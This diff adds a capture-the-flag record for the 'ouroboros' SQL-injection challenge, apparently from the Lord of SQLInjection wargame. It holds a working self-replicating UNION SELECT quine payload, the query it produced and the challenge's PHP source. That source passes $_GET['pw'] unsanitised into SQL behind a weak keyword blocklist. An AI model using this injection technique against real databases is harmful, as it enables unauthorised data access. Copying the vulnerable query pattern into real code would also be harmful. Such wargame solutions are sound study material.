@@ -1,0 +1,18 @@
+query : select pw from prob_ouroboros where pw='x' union SELECT REPLACE(REPLACE('x" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$")#',CHAR(34),CHAR(39)),CHAR(36),'x" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$")#')#'
+
+Pw : x' union SELECT REPLACE(REPLACE('x" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$")#',CHAR(34),CHAR(39)),CHAR(36),'x" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$")#')#
+
+OUROBOROS Clear!
+http://www.wechall.net
+<?php
+  include "./config.php";
+  login_chk();
+  $db = dbconnect();
+  if(preg_match('/prob|_|\.|rollup|join|@/i', $_GET['pw'])) exit("No Hack ~_~");
+  $query = "select pw from prob_ouroboros where pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if($result['pw']) echo "<h2>Pw : {$result[pw]}</h2>";
+  if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("ouroboros");
+  highlight_file(__FILE__);
+?>
